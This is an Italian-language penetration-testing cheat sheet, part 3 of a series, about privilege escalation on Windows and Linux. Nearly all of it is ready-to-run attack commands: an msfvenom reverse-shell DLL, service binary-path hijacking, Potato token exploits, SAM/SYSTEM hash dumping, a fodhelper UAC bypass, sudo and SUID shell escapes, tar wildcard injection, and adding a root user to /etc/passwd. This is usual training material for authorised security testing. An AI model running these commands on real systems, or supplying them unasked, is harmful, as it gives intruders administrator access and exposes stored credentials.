# ⬆️ Fase 3: Privilege Escalation

```
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

**Obiettivo:** Eleva i privilegi da utente standard ad Administrator/SYSTEM (Windows) o root (Linux).

> 📚 **Guide complete:** [Windows PrivEsc](../Windows-PrivEsc/translations/README.it.md) | [Linux PrivEsc](../Linux-PrivEsc/translations/README.it.md)

---

## 🖥️ Privilege Escalation su Windows

### Quick Wins - Da controllare subito
```cmd
# Controlla privilegi attuali
whoami /priv
whoami /groups

# Controlla credenziali memorizzate
cmdkey /list

# File di installazione unattended
dir /s C:\*unattend.xml C:\*sysprep.inf C:\*sysprep.xml 2>nul

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Exploit di Servizi

#### Unquoted Service Path
```cmd
# Trova percorsi non quotati
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Se trovato: C:\Program Files\Some Service\service.exe
# Inserisci exe malevolo in: C:\Program.exe o C:\Program Files\Some.exe
```

#### Permessi deboli sui servizi
```cmd
# Controlla permessi con accesschk
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# Se SERVICE_CHANGE_CONFIG:
sc config VulnService binpath="C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

#### DLL Hijacking
```powershell
# Trova servizi con DLL mancanti (usa Process Monitor)
# Inserisci DLL malevola nella cartella del servizio
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### Token Impersonation

#### SeImpersonatePrivilege (Potato Attacks)
```cmd
# Controlla se hai SeImpersonatePrivilege
whoami /priv

# PrintSpoofer (Windows 10/Server 2016-2019)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (Windows 2012-2022)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\temp\shell.exe"

# JuicyPotato (Windows 7/Server 2008-2016)
.\JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t * -c {CLSID}
```

#### SeBackupPrivilege
```powershell
# Backup di SAM e SYSTEM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Estrai hash sulla macchina attaccante
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Exploit sul Registro
```cmd
# AutoRun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Task pianificati con path scrivibili
schtasks /query /fo LIST /v | findstr /i "Task To Run"

# Permessi sul registro
accesschk.exe -kvw hklm\SOFTWARE
```

### UAC Bypass
```powershell
# Fodhelper bypass (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

### Strumenti Automatizzati
```bash
# WinPEAS
.\winPEAS.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Windows-Exploit-Suggester
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024.xlsx
```

---

## 🐧 Privilege Escalation su Linux

### Quick Wins - Da controllare subito
```bash
# Permessi sudo
sudo -l

# Binari SUID
find / -perm -4000 -type f 2>/dev/null

# /etc/passwd scrivibile
ls -la /etc/passwd

# Versione kernel per exploit
uname -a
```

### Exploit Sudo

#### Sudo senza password
```bash
# Se sudo -l mostra: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'

# Se sudo -l mostra: (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# Se sudo -l mostra: (ALL) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/sh")'
```

#### Exploit versione sudo (CVE-2021-3156)
```bash
# Controlla versione sudo
sudo --version

# Se sudo < 1.9.5p2
# Usa exploit: https://github.com/blasty/CVE-2021-3156
```

### Binari SUID/SGID
```bash
# Trova binari SUID
find / -perm -4000 -type f 2>/dev/null

# Controlla GTFOBins per exploit
# https://gtfobins.github.io/

# Esempio: SUID su /usr/bin/find
/usr/bin/find . -exec /bin/sh -p \; -quit

# Esempio: SUID su /usr/bin/vim
/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# Esempio: SUID su /usr/bin/python
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Capabilities
```bash
# Trova binari con capabilities
getcap -r / 2>/dev/null

# Esempio: cap_setuid su python
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Cron Job
```bash
# Controlla cron job
cat /etc/crontab
ls -la /etc/cron.*

# Cerca script scrivibili
# Wildcard injection in tar:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

### PATH Hijacking
```bash
# Se un cron/script chiama un binario senza path completo
# Crea binario malevolo in una cartella PATH scrivibile

echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
```

### /etc/passwd scrivibile
```bash
# Se /etc/passwd è scrivibile
# Genera hash password
openssl passwd -1 -salt evil password123

# Aggiungi utente root
echo 'evil:$1$evil$xyz...:0:0::/root:/bin/bash' >> /etc/passwd

# Passa al nuovo utente root
su evil
```

### Exploit Kernel
```bash
# Controlla versione kernel
uname -r
cat /proc/version

# Cerca exploit
searchsploit linux kernel 4.4 privilege escalation

# Exploit kernel popolari:
# - DirtyCow (CVE-2016-5195) - Kernel 2.x - 4.x
# - DirtyPipe (CVE-2022-0847) - Kernel 5.8 - 5.16.11
```

### Exploit NFS
```bash
# Controlla no_root_squash
showmount -e 192.168.1.10
cat /etc/exports

# Se no_root_squash:
# Monta share, crea binario SUID come root
mount -t nfs 192.168.1.10:/share /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash

# Sul target:
/mnt/bash -p
```

### Strumenti Automatizzati
```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux-exploit-suggester
./linux-exploit-suggester.sh

# Linux Smart Enumeration (LSE)
./lse.sh -l 2
```

---

## 📊 Riferimento Rapido

### Windows Checklist
```markdown
- [ ] whoami /priv (SeImpersonate, SeBackup, ecc.)
- [ ] Unquoted service paths
- [ ] Weak service permissions
- [ ] AlwaysInstallElevated
- [ ] Credenziali memorizzate (cmdkey /list)
- [ ] File Unattend/Sysprep
- [ ] Task pianificati
- [ ] Esegui WinPEAS/PowerUp
```

### Linux Checklist
```markdown
- [ ] sudo -l
- [ ] Binari SUID (controlla GTFOBins)
- [ ] Capabilities
- [ ] Cron job (script scrivibili, wildcard)
- [ ] /etc/passwd scrivibile
- [ ] Versione kernel (exploit)
- [ ] NFS no_root_squash
- [ ] Esegui LinPEAS
```

---

## 🔗 Cheatsheet Correlate

- [Windows PrivEsc (Completo)](../Windows-PrivEsc/translations/README.it.md)
- [Linux PrivEsc (Completo)](../Linux-PrivEsc/translations/README.it.md)
- [Mimikatz](../Mimikatz/translations/README.it.md)

---

**Fase Precedente:** [← 02 - Enumeration](./02-Enumeration.it.md)

**Fase Successiva:** [04 - Lateral Movement →](./04-Lateral-Movement.it.md)
